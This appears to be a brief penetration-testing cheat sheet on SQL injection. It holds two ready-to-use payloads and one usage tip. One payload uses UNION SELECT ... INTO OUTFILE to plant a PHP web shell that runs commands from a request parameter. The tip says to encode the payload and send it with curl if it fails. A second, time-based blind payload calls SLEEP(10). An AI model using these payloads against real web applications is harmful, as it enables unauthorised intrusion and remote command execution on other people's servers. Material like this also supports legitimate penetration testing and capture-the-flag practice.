# SQL Injection

- SQL Injection write to file via shell
```
test' union select '<?php echo system($_REQUEST["bingo"]); ?>' into outfile '/srv/http/cmd.php' -- -
```

- If it does not work, encode all characters and send via `curl`.

## Blind
```
TEST' UNION SELECT SLEEP(10);-- -
```
